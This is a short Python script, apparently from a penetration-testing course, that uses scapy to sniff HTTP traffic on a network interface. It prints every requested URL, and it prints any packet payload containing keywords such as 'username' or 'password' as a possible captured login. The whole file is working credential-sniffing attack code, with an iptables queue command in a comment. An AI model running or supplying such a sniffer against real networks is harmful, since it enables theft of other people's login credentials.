#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

# to prevent forwarding of packets, use the below linux command to modify iptables
# iptables -I FORWARD -j NFQUEUE --queue-num 0

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) # prn is the callback function

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        #print(packet[scapy.Raw].load)
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "uname", "user", "userid", "login", "password", "pass", "pwd"]
        for keyword in keywords:
            if keyword in load:
                return load  


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #print(packet.show())
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode())
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username & password > " + login_info + "\n\n")


sniff("enp0s3")

#ref: pip install --trusted-host pypi.org --trusted-host files.pythonhosted.org NetFilterQueue
#ref: https://gitlab.com/kalilinux/packages/python-netfilterqueue/tree/kali/master